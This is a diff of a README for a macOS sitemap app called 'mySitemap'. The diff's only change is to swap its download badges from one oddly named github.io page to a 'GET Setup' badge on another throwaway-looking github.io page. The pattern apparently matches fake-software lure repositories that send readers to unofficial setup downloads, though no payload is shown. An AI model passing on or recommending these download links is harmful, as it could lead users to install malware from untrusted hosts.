@@ -2,11 +2,7 @@
 
 ![mySitemap Cover](https://i.ytimg.com/vi/cuDrMmIy3mU/maxresdefault.jpg)
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/Mysitenmap">
-    <img src="https://img.shields.io/badge/⬇️_Download_mySitemap-34495e?style=for-the-badge&logo=apple&logoColor=white" alt="Download mySitemap for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://juliannecocomazziyzenmk.github.io/.github/mySitemap)
 
 ---
 
@@ -83,11 +79,7 @@ Yes — custom styles and grouping are supported.
 **Does it require internet access?**  
 No — works entirely offline, except for file sharing.  
 
-<p align="center">
-  <a href="https://rumpels-kaji.github.io/.github/sitenmap">
-    <img src="https://img.shields.io/badge/⬇️_Download_mySitemap-34495e?style=for-the-badge&logo=apple&logoColor=white" alt="Download mySitemap for macOS">
-  </a>
-</p>
+[![GET Setup](https://img.shields.io/badge/GET%20%E2%80%94%20Setup-0078D6?style=for-the-badge&logoColor=white)](https://juliannecocomazziyzenmk.github.io/.github/mySitemap)
 
 ---
 
